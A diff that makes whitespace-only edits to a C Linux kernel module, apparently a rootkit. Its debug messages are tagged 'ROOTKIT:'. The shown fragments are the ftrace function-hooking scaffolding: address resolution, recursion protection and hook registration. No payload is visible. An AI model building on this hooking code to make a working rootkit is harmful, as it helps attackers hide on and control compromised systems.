@@ -3,10 +3,6 @@
  * Author: 0x4p0ll0
  * License: GPL
  * */
-
-
-
-
 #include <linux/ftrace.h>
 #include <linux/linkage.h>
 #include <linux/slab.h>
@@ -35,7 +31,7 @@
 
 /* to prevent recursion inside the hook we need to implement a security mesure: Hook → detect recursion using return address → call original safely*/
 #define USE_FENTRY_OFFSET 0
-#if !USE_FENTRY_OFFSET 
+#if !USE_FENTRY_OFFSET
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
@@ -78,7 +74,7 @@ static int resolve_hook_address(struct ftrace_hook *hook)
 
   #if USE_FENTRY_OFFSET
     *((unsigned long*) hook->original) =hook->address +MCOUNT_INSN_SIZE;
-  #else 
+  #else
     *((unsigned long*) hook->original) =hook->address;
   #endif
   return 0;
@@ -119,7 +115,7 @@ static int install_hook (struct ftrace_hook* hook){
   if (error) {
     printk(KERN_DEBUG"ROOTKIT:register_ftrace_function() failed :%d\n",error);
     return error;
-    
+
   }
   return 0;
 }
